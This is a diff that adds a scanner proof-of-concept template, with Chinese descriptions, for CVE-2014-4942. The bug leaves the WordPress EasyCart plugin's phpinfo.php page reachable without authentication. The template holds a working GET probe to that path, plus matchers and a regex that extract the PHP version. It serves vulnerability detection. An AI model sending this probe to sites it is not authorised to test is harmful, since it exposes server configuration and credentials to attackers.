@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "WordPress EasyCart 插件 2.0.6 之前版本中 inc/admin/phpinfo.php 文件未做访问控制，直接调用 phpinfo() 函数。远程攻击者无需认证即可通过 GET 请求获取服务器 PHP 配置信息，包括环境变量、数据库连接参数等敏感数据。"
+id = "POC-AVE-2014-0031"
+name = "WordPress EasyCart <2.0.6 信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-2014-0031"]
+vuln_id = [
+    "CVE-2014-4942",
+    "AVE-2014-0031",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php"
+protocol = "http"
+
+[[poc.requests.extractors]]
+group = 1
+name = "php_version"
+part = "body"
+regex = ['>PHP Version <\/td><td class="v">([0-9.]+)']
+type = "regex"
+value = "{{php_version}}"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "PHP Extension",
+    "PHP Version",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
